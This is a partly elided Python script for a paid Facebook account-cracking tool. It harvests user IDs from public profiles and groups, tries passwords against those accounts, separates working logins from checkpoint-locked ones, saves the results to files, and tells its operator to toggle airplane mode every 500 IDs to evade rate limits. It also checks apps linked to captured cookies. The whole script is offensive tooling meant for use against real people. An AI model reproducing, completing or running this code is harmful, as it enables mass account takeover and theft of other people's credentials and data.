...
\33[1;33m| $$  | $$| $$\  $$ | $$      | $$\  $$$| $$$/ \  $$$| $$  | $$
\33[32m|  $$$$$$/| $$ \  $$| $$$$$$$$| $$ \  $$| $$/   \  $$| $$  | $$
 \______/ |__/  \__/|________/|__/  \__/|__/     \__/|__/  |__/

█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[1;33m█  \33[mGithub: https://github.com/Okenwa24
\33[1;33m█  \33[mFacebook: Okenwa Bright
\33[1;33m█  \33[mWhatsApp: +2347061758885
\33[1;33m█  \33[mTools : \33[1;33mPAID
\33[1;33m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""%(h))
os.system("clear")
banner()
def chk():
  ...
  try: 
    ...
    if id in httpCaht: 
      ...
      os.system('xdg-open  https://wa.me/2347061758885?text=*Hello*%2C%20*Okenwa*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*apk*%20*UPDATED*')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def menu(my_name):
	banner()
	print(x+'\33[m[~_~]\033[96mNAME  : \33[m'+str(my_name))
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
	print("""%s \33[m[01] \33[1;33mCRACK FROM PUBLIC ID """%(h))
	print("""%s \33[m[02] \33[1;33mCHECK CRACK RESULTS """%(h))
	...
	if jh in ['1','01']:
		...
		print(x+'\33[1;96m•Patiently waiting for a taxi ...')
		time.sleep(1)
		print("""%s \33[1;33mSUCCESS OUT OF CROTT AHH """%(h))
		exit()
	else:
		print("""%s \33[1;33mInvite gelud om choose the right one """%(h))
		exit()
...
def dump_massal():
	...
	try:
		...
		exit()
	if jum<1 or jum>10:
		pesan = '# INPUT THE NUMBER OF OMs ID, NOT HIS ID'
		pesan2 = mark(pesan, style='yellow')
		sol().print(pesan2)
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input(x+'\33[m[ ? ] \33[1;96m•INPUT ID TO '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# SUCCESSFUL DUMP %s ID '%(len(id))
	if len(id)==0:
...
def setting():
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
	print("""%s \33[m[01] \33[1;32mOLDEST ACCOUNT"""%(h))
	print("""%s \33[m[02] \33[1;32mYOUNGEST ACCOUNT """%(h))
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
	...
	if hu in ['1','01']:
		...
		print("""%s \33[1;33mOption Not On Me"""%(h))
		exit()
	...
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
	aplik = input(x+'\33[m[ ? ] \33[1;32m•Show Related Apps ? (y/t):  ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'\33[m[ ? ] \33[1;33m•Show Checkpoint Options ? (y/t):  ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
def passwrd():
	...
	banner()
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
	print("""%s\33[m•OK Result Saved To : OK/%s\n\33[m•CP Result Saved To : CP/%s\n\33[m•TRUN ON/OF AIRCRAFT MODE EVERY 500 Id\n\33[1;33m•  WHILE WAITING FOR THE CRACK PROCESS\n\33[1;33m•COLI OM RECOMMENDED"""%(h,okc,cpc))
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print('\n')
					print(f"\33[1;32m [OK]\33[1;92m{idf}\33[m•\33[1;92m{pw}\n")
					break
...
def lah():
	...
	input(balmond+m +" Airplane Mode 5 Seconds And Press Enter To Start Crack ")
	pass
	setting()
	
def grup():
	win = '# MAKE SURE THE PUBLIC GROUP ID'
	win2 = mark(win, style='cyan')
	sol().print(win2)
	id = input(""+balmond+h+" \33[1;96Group ID or User Name : ")
	...
	try:
		...
		print(balmond+m+" \33[1;33mInternet Connection Disconnected..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	...
	if berr2=='Login Facebook':
		...
		jalan(balmond+m+" \33[1;33mGroup Not Found..")
		time.sleep(0.5)
		exit()
	else:pass
	print(""+balmond+p+" \33[1;32mGroup Name : "+berr2)
	...
	if len(ang)==0:
		...
		print(balmond+h+" Member : "+str(ang[0]))
	grup1(url)
...
def grup1(urls):
	...
	print(balmond+m+" \33[1;32mCollecting ID")
...
def cek_apk(kuki):
	...
	try:
		for i in range(len(game)):
			print ("\n  %s%s. %s%s"%(P,i+1,H,game[i].replace("Added to"," Added to")))
	...
	try:
		for i in range(len(game)):
			print ("\n   %s%s. %s%s"%(P,i+1,M,game[i].replace("Expired","Expired")))
	except AttributeError:
		print ("\n%s• cookie invalid"%(M))
